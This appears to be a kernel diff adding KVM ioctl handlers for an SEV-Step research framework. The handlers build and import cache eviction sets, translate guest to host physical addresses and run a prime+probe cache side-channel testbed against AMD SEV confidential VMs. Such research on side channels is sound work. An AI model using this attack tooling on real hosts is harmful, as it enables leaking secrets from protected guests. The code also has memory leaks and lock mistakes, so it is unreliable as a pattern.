+			//shorthand pointing to currently processed lookup table
+			lookup_table_t* cur_lut;
+			//shorthand pointing to currently processed eviction table
+			addr_list_t* cur_ev;
+			int j;
+			cur_lut = &attack_targets[attack_target_idx];
+			cur_ev = &eviction_sets[attack_target_idx];
+
+			initAddrList(cur_ev);
+
+			printk("KVM_SEV_STEP_BUILD_EVS: building eviction set for table idx %d,"
+				"starting at guest vaddr 0x%llx, spanning %llu bytes\n",
+				attack_target_idx, cur_lut->base_vaddr_table, cur_lut->table_bytes);
+
+			//iterate over of the number of cachelines per lookup table
+			for( j = 0; j < cur_lut->table_bytes/64 && !error_bulding_ev ; j++ ) {
+				uint64_t colliding_vaddr;
+				uint64_t victim_addr;
+				victim_addr = cur_lut->base_vaddr_table+(j*64);
+				printk("KVM_SEV_STEP_BUILD_EVS: calling kernel_get_colliding_vaddr for 0x%llx\n",victim_addr);
+				if( kernel_get_colliding_vaddr(victim_addr,&colliding_vaddr)) {
+					insert_end(cur_ev,colliding_vaddr);
+					printk("success\n");
+				} else {
+					printk("failure, aborting\n");
+					error_bulding_ev = true;
+				}
+			}
+		}
+
+		//on error free everything allocated so far
+		if( error_bulding_ev ) {
+			printk("KVM_SEV_STEP_BUILD_EVS: cleaning up everything allocated so far\n");
+			kfree(attack_targets);
+			free_eviction_sets(eviction_sets,param.attack_targets_len);
+			return -EINVAL;
+		}
+
+		//
+		//Store Eviction Set in sev step context
+		//
+		mutex_lock(&sev_step_config_mutex);
+
+		if( global_sev_step_config.cache_attack_config != NULL ) {
+			printk("KVM_SEV_STEP_BUILD_EVS: overwriting existing cache attack config. This should not happen\n");
+			free_sev_step_cache_attack_config_t(global_sev_step_config.cache_attack_config);
+		}
+		global_sev_step_config.cache_attack_config = kmalloc(sizeof(sev_step_cache_attack_config_t),GFP_KERNEL);
+		global_sev_step_config.cache_attack_config->lookup_tables = attack_targets;
+		global_sev_step_config.cache_attack_config->lookup_tables_len = param.attack_targets_len;
+		global_sev_step_config.cache_attack_config->eviction_sets = eviction_sets;
+		global_sev_step_config.cache_attack_config->chase_result_for_aliasing_attack = NULL;
+		global_sev_step_config.cache_attack_config->probe_array = NULL;
+		global_sev_step_config.cache_attack_config->cache_attack_perf = param.cache_attack_perf;
+
+		mutex_unlock(&sev_step_config_mutex);
+
+
+
+	}
+	r = 0;
+	break;
+	case KVM_SEV_STEP_FREE_EVS: {
+		sev_step_cache_attack_config_t* config;
+		printk("KVM_SEV_STEP_FREE_EVS: got called");
+
+		mutex_lock(&sev_step_config_mutex);
+		if( global_sev_step_config.cache_attack_config == NULL ) {
+			printk("KVM_SEV_STEP_FREE_EVS: no active config found\n");
+			mutex_unlock(&sev_step_config_mutex);
+			return -EINVAL;
+		}
+
+		config = global_sev_step_config.cache_attack_config;
+		global_sev_step_config.cache_attack_config = NULL;
+		mutex_unlock(&sev_step_config_mutex);
+
+		switch (config->type) {
+		case SEV_STEP_EV_TYPE_L1D_KERN_ONLY:
+			free_sev_step_cache_attack_config_t(config);
+			break;
+		case SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING: {
+			uint64_t idx;
+
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to kfree config->lookup_tables\n",__FILE__,__LINE__);
+			kfree(config->lookup_tables);
+
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to upin pages\n",__FILE__,__LINE__);
+			for( idx = 0; idx < config->lookup_tables_len; idx++) {
+				unpin_user_pages(config->pinned_pages[idx],
+					config->pinned_pages_inner_len[idx]
+				);
+				kfree(config->pinned_pages[idx]);
+			}
+			kfree(config->pinned_pages);
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to kfree config->eviction_sets\n",__FILE__,__LINE__);
+			kfree(config->eviction_sets);
+
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to kfree config\n",__FILE__,__LINE__);
+			kfree(config);
+		}
+		break;
+		case SEV_STEP_EV_TYPE_FROM_USER: {
+			uint64_t idx;
+
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to kfree config->lookup_tables\n",__FILE__,__LINE__);
+			kfree(config->lookup_tables);
+
+			for(idx = 0; idx < config->lookup_tables_len; idx++ ) {
+				free_kernel_mappings_for_user_eviction_set(&config->eviction_sets[idx],
+					config->pinned_pages[idx],config->pinned_pages_inner_len[idx]);
+				kfree(config->pinned_pages[idx]);
+			}
+			kfree(config->pinned_pages);
+
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to kfree config->eviction_sets\n",__FILE__,__LINE__);
+			kfree(config->eviction_sets);
+
+			printk("%s:%dd KVM_SEV_STEP_FREE_EVS: Going to kfree config\n",__FILE__,__LINE__);
+			kfree(config);
+		}
+			break;
+		default:
+			printk("%s:%dd undefined config->type value %d\n",__FILE__,__LINE__,config->type);
+			break;
+		}
+
+	}
+	r = 0;
+	break;
+	case KVM_SET_STEP_IMPORT_USER_EVS: {
+		//this is the final copy that consists only of kernel memory
+		import_user_eviction_set_param_t* params;
+
+		//buffer for shallow copy of import_user_eviction_set_param_t from user space
+		import_user_eviction_set_param_t params_buf;
+		//buffer for shallow copy of params_buff.params_buff.eviction_sets
+		lookup_table_eviction_set_t* eviction_sets_buf;
+		uint64_t params_attack_targets_bytes;
+		uint64_t params_eviction_sets_bytes;
+		uint64_t idx,pinned_pages_inner_idx;
+
+		struct page*** pinned_pages;
+		uint64_t* pinned_pages_inner_len;
+
+
+		addr_list_t* kernel_eviction_sets;
+
+		printk("KVM_SET_STEP_IMPORT_USER_EVS: got called\n");
+
+		//
+		// Perform a deep copy of user supplied args to kernel space. Result is in params
+		//
+
+		if( copy_from_user(&params_buf, argp, sizeof(import_user_eviction_set_param_t))) {
+			printk("%s:%d : KVM_SET_STEP_IMPORT_USER_EVS: failed to copy params_buf\n",__FILE__,__LINE__);
+			return -EINVAL;
+		}
+
+		params = kmalloc(sizeof(import_user_eviction_set_param_t), GFP_KERNEL);
+		params->len = params_buf.len;
+		params->way_count = params_buf.way_count;
+		params->cache_attack_perf = params_buf.cache_attack_perf;
+
+		//fill params.attack_targets
+		params_attack_targets_bytes = sizeof(lookup_table_t)* params_buf.len;
+		params->attack_targets = kmalloc(params_attack_targets_bytes, GFP_KERNEL);
+		if( copy_from_user(params->attack_targets, params_buf.attack_targets, params_attack_targets_bytes )) {
+			printk("%s:%d : KVM_SET_STEP_IMPORT_USER_EVS: failed"
+				"to copy params.attack_targets\n",__FILE__,__LINE__);
+			return -EINVAL;
+		}
+
+		//copy params_buf.eviction_sets to eviction_sets_buf
+		params_eviction_sets_bytes = sizeof(lookup_table_eviction_set_t) * params_buf.len;
+		eviction_sets_buf = kmalloc(params_eviction_sets_bytes, GFP_KERNEL);
+		if( copy_from_user(eviction_sets_buf, params_buf.eviction_sets, params_eviction_sets_bytes )) {
+			printk("%s:%d : KVM_SET_STEP_IMPORT_USER_EVS: failed"
+				"to copy eviction_sets_buf\n",__FILE__,__LINE__);
+			return -EINVAL;
+		}
+
+		//iterate over each eviction_sets_buff and copy to kernel space
+		for( idx = 0; idx < params->len; idx++) {
+			uint64_t* buf_eviction_sets;
+			uint64_t eviction_sets_buf_bytes;
+
+
+			eviction_sets_buf_bytes = sizeof(uint64_t) * eviction_sets_buf[idx].eviction_sets_len;
+			buf_eviction_sets = kmalloc(eviction_sets_buf_bytes, GFP_KERNEL);
+
+			if(copy_from_user(buf_eviction_sets, eviction_sets_buf[idx].eviction_sets, eviction_sets_buf_bytes ) ) {
+				printk("%s:%d : KVM_SET_STEP_IMPORT_USER_EVS: failed"
+				"to copy eviction_sets_buff[%llu]\n",__FILE__,__LINE__,idx);
+				return -EINVAL;
+			}
+			eviction_sets_buf[idx].eviction_sets = buf_eviction_sets;
+
+
+		}
+		params->eviction_sets = eviction_sets_buf;
+
+		printk("%s:%d KVM_SEV_STEP_BUILD_EVS: Got %llu lut and %llu eviction sets with %llu entries each\n",
+			__FILE__,__LINE__,params->len,params->eviction_sets->eviction_sets_len,
+			params->way_count);
+		//
+		// Get a persistent kernel space mapping for each addr that the user supplied as an eviction set
+		//
+
+		
+
+		pinned_pages = kmalloc( sizeof(struct page**) * params->len, GFP_KERNEL);
+		pinned_pages_inner_len = kmalloc( sizeof(uint64_t) * params->len, GFP_KERNEL);
+
+		//loop over eviction sets and do pinning
+		kernel_eviction_sets = kmalloc( sizeof(addr_list_t) * params->len, GFP_KERNEL);
+		for( idx = 0; idx < params->len; idx++ ) {
+
+			initAddrList(&kernel_eviction_sets[idx]);
+			pinned_pages_inner_len[idx] = params->eviction_sets[idx].eviction_sets_len;
+			pinned_pages[idx] = kmalloc(sizeof( struct page**) * pinned_pages_inner_len[idx], GFP_KERNEL );
+
+			if(get_kernel_mappings_for_user_evictin_set(&params->eviction_sets[idx],
+				&kernel_eviction_sets[idx],pinned_pages[idx]) ) {
+				printk("%s:%d : get_kernel_mappings_for_user_evictin_set failed\n",__FILE__,__LINE__);
+				//TODO: clenaup params allocation
+				return -EINVAL;
+			}
+
+		//Fetch Addrs used during vm state switch and check if they collide with eviction set
+		if( !global_sev_step_config.state_save_values_valid ) {
+			printk("%s:%d KVM_SEV_STEP_BUILD_EVS: omitting cross check with save"
+				"area pages as they are not initialized",__FILE__,__LINE__
+			);
+		} else {
+			const int setBits = 14; // 10; // 1024 sets
+    		const int pfnSetBits = setBits - 6; // a page covers 12 bits
+    		const uint64_t pfnSetBitsMask = (((1ull << pfnSetBits) - 1) << (6 + 6));
+			addr_list_entry_t* e;
+			pinned_pages_inner_idx = 0;
+
+			for (e = kernel_eviction_sets[idx].first; e != NULL; e = e->next) {
+				uint64_t ev_hfn = page_to_pfn(pinned_pages[idx][pinned_pages_inner_idx]);
+				uint64_t ev_hpa = (ev_hfn << 12) | (e->addr & 0xfff);
+				uint64_t ev_set_bits = ev_hpa & pfnSetBitsMask;
+				uint64_t vmsa_set_bits = global_sev_step_config.vmsa_hpa & pfnSetBitsMask;
+				uint64_t vmcb_set_bits = global_sev_step_config.vmcb_hpa & pfnSetBitsMask;
+				/*printk("evn_hfn 0x%llx, ev_hpa 0x%llx, ev_set_bits 0x%llx, vmsa_set_bits 0x%llx, vmcb_set_bits 0x%llx",
+					ev_hfn, ev_hpa, ev_set_bits, vmsa_set_bits, vmcb_set_bits
+				);*/
+				if( ev_set_bits == vmsa_set_bits) {
+					printk("ev_hpa 0x%llx and vmsa_hpa 0x%llx both have set bits 0x%llx\n",
+						ev_hpa, global_sev_step_config.vmsa_hpa,ev_set_bits
+					);
+				}
+				if( ev_set_bits == vmcb_set_bits) {
+					printk("ev_hpa 0x%llx and vmcb_hpa 0x%llx both have set bits 0x%llx\n",
+						ev_hpa, global_sev_step_config.vmcb_hpa,ev_set_bits
+					);
+				}
+
+				pinned_pages_inner_idx += 1;
+			}
+			printk("checked %llu pages of kernel_eviction_sets[%llu] for colissions with state save\n",
+				pinned_pages_inner_idx,idx
+			);
+		}
+
+			kfree(eviction_sets_buf[idx].eviction_sets);
+		}
+		kfree(params->eviction_sets);
+
+		
+		
+
+		//
+		// Store everything in cache attack context
+		//
+		mutex_lock(&sev_step_config_mutex);
+
+		if( global_sev_step_config.cache_attack_config != NULL ) {
+			printk("KVM_SEV_STEP_BUILD_EVS: overwriting existing cache attack config. This should not happen\n");
+			free_sev_step_cache_attack_config_t(global_sev_step_config.cache_attack_config);
+		}
+		global_sev_step_config.cache_attack_config = kmalloc(sizeof(sev_step_cache_attack_config_t),GFP_KERNEL);
+		global_sev_step_config.cache_attack_config->lookup_tables = params->attack_targets;
+		global_sev_step_config.cache_attack_config->lookup_tables_len = params->len;
+		global_sev_step_config.cache_attack_config->eviction_sets = kernel_eviction_sets;
+		global_sev_step_config.cache_attack_config->type = SEV_STEP_EV_TYPE_FROM_USER;
+		global_sev_step_config.cache_attack_config->way_count = params->way_count;
+		global_sev_step_config.cache_attack_config->pinned_pages = pinned_pages;
+		global_sev_step_config.cache_attack_config->pinned_pages_inner_len = pinned_pages_inner_len;
+		global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_IDLE;
+		global_sev_step_config.cache_attack_config->chase_result_for_aliasing_attack = NULL;
+		global_sev_step_config.cache_attack_config->probe_array = NULL;
+		global_sev_step_config.cache_attack_config->cache_attack_perf =  params->cache_attack_perf;
+
+		mutex_unlock(&sev_step_config_mutex);
+
+	}
+	r = 0;
+	break;
+	case KVM_SEV_STEP_DO_CACHE_ATTACK_NEXT_STEP: {
+		do_cache_attack_param_t param;
+		printk("KVM_SEV_STEP_DO_CACHE_ATTACK_NEXT_STEP: got called\n");
+
+		if( copy_from_user(&param, argp, sizeof(param))) {
+			printk("KVM_SEV_STEP_DO_CACHE_ATTACK_NEXT_STEP: failed to copy do_cache_attack_param_t args\n");
+			return -EINVAL;
+		}
+
+		mutex_lock(&sev_step_config_mutex);
+		if( global_sev_step_config.cache_attack_config == NULL ) {
+			printk("KVM_SEV_STEP_DO_CACHE_ATTACK_NEXT_STEP: no active config found\n");
+			mutex_unlock(&sev_step_config_mutex);
+			return -EINVAL;;
+		}
+
+		if( (global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_DISABLED) ||
+			 global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_ENABLED_WANT_DISABLE) {
+			printk("KVM_SEV_STEP_DO_CACHE_ATTACK_NEXT_STEP: single stepping not active or termination requested\n");
+			mutex_unlock(&sev_step_config_mutex);
+			return -EINVAL;
+		}
+
+		if( param.lookup_table_index > global_sev_step_config.cache_attack_config->lookup_tables_len ) {
+			printk("KVM_SEV_STEP_DO_CACHE_ATTACK_NEXT_STEP: index out of bounds\n");
+			mutex_unlock(&sev_step_config_mutex);
+			return -EINVAL;;
+		}
+
+		global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_WANT_PRIME;
+		global_sev_step_config.cache_attack_config->victim_lookup_table_idx = param.lookup_table_index;
+
+		mutex_unlock(&sev_step_config_mutex);
+
+	}
+	r = 0;
+	break;
+	case KVM_SEV_STEP_GPA_TO_HPA: {
+		gpa_to_hpa_param_t param;
+		uint64_t offset;
+		gfn_t gfn;
+		kvm_pfn_t pfn;
+		struct page *page;
+		uint64_t hva;
+		int locked;
+		//bool async = false;
+		//bool writeable;
+		printk("KVM_SEV_STEP_GPA_TO_HPA: got called\n");
+
+		if( copy_from_user(&param, argp, sizeof(param))) {
+			printk("KVM_SEV_STEP_GPA_TO_HPA: failed to copy gpa_to_hpa_t args\n");
+			return -EINVAL;
+		}
+
+		if( global_sev_step_config.main_vm == NULL ) {
+			printk("KVM_SEV_STEP_GPA_TO_HPA: main_vm is NULL\n");
+			return -EINVAL;;
+		}
+
+		offset = param.in_gpa & 0xfff;
+		gfn = param.in_gpa >> 12;
+
+		hva = kvm_vcpu_gfn_to_hva(global_sev_step_config.main_vm->vcpus[0],gfn);
+		
+		mmap_read_lock(global_sev_step_config.main_vm->mm);
+		locked = 1;
+		//TODO: unpin?. Ideally after cache attack is done
+		//Come back to this once the cache attack works
+		if (get_user_pages_remote(global_sev_step_config.main_vm->mm,
+			hva, 1, 0/*FOLL_WRITE*/, &page,NULL,&locked) != 1) {
+			printk("get_user_pages_remote_unlocked failed\n");
+		} else {
+			printk("get_user_pages_remote_unlocked was successfull");
+		}
+		mmap_read_unlock(global_sev_step_config.main_vm->mm);
+
+
+		pfn = page_to_pfn(page);
+		printk("pfn is 0x%llx\n",pfn);
+		param.out_hpa = (pfn << 12 ) | offset;
+
+		//TODO: only god knows why this did not work; keep commnented code for reference
+		//until cache attack has stabilized
+		/*pfn = hva_to_pfn(hva, true, &async,true,&writeable);
+		param.out_hpa = (pfn << 12) | offset;
+		printk("KVM_SEV_STEP_GPA_TO_HPA: pfn 0x%llx, out_hpa 0x%llx\n",pfn,param.out_hpa);*/
+
+		/*pfn = gfn_to_pfn(global_sev_step_config.main_vm,gfn);
+		printk("KVM_SEV_STEP_GPA_TO_HPA: pfn try2 0x%llx\n",pfn);
+		param.out_hpa = (pfn << 12) | offset;*/
+
+		/*printk("KVM_SEV_STEP_GPA_TO_HPA: gpa 0x%llx, gfn 0x%llx, offset 0x%llx\n",param.in_gpa,gfn,offset);
+		pfn = kvm_vcpu_gfn_to_pfn(global_sev_step_config.main_vm->vcpus[0],gfn);
+		param.out_hpa = (pfn << 12) | offset;
+		printk("KVM_SEV_STEP_GPA_TO_HPA: pfn 0x%llx, out_hpa 0x%llx\n",pfn,param.out_hpa);
+		printk("KVM_SEV_STEP_GPA_TO_HPA: is_error_pfn %d, is_error_noslot_pfn %d, is_noslot_pfn %d\n",
+			is_error_pfn(pfn),is_error_noslot_pfn(pfn), is_noslot_pfn(pfn) );
+
+		pfn = kvm_vcpu_gfn_to_pfn_atomic(global_sev_step_config.main_vm->vcpus[0],gfn);
+		printk("KVM_SEV_STEP_GPA_TO_HPA: pfn 0x%llx",(uint64_t)pfn);
+
+		hva = kvm_vcpu_gfn_to_hva(global_sev_step_config.main_vm->vcpus[0],gfn);
+		printk("KVM_SEV_STEP_GPA_TO_HPA: hva 0x%llx",(uint64_t)hva);
+		printk("KVM_SEV_STEP_GPA_TO_HPA: virt_to_phys on hva : 0x%llx\n",virt_to_phys((void*)hva));
+		*/
+
+		if( copy_to_user(argp, &param, sizeof(param))) {
+			printk("KVM_SEV_STEP_GPA_TO_HPA: failed to copy gpa_to_hpa_t back to userspace\n");
+			return -EINVAL;
+		}
+
+	}
+	r = 0;
+	break;
+	case KVM_SEV_STEP_CACHE_ATTACK_TESTBED: {
+		struct task_struct *prime_probe_thread = NULL;
+		const int prime_probe_thread_cpu = 9;
+		cache_attack_testbed_thread_args_t thread_args = {
+			.is_done = false,
+		};
+		spin_lock_init(&thread_args.lock);
+
+
+		if( global_sev_step_config.cache_attack_config == NULL ) {
+			printk("KVM_SEV_STEP_CACHE_ATTACK_TESTBED: cache attack config was null, abort\n");
+			return -EINVAL;
+		}
+
+		
+		prime_probe_thread = kthread_create(cache_attack_testbed_multiple_sets_indiviual_timing_fn, &thread_args, "cache attack thread");
+		if( prime_probe_thread == NULL ) {
+			printk("%s:%d KVM_SEV_STEP_CACHE_ATTACK_TESTBED: kthread create failed\n",__FILE__,__LINE__);
+			return -EINVAL;
+		}
+
+		kthread_bind(prime_probe_thread, prime_probe_thread_cpu);
+		//start_counting_thread();
+		wake_up_process(prime_probe_thread);
+		
+
+		printk("KVM_SEV_STEP_CACHE_ATTACK_TESTBED: waiting for prime_probe thread to finish");
+		//wait for process to finish
+		while( 1 ) {
+			spin_lock(&thread_args.lock);
+			if( thread_args.is_done) {
+				break;
+				spin_unlock(&thread_args.lock);
+			}
+			spin_unlock(&thread_args.lock);
+		}
+		
+
+		//stop_counting_thread();
 	}
 	r = 0;
 	break;
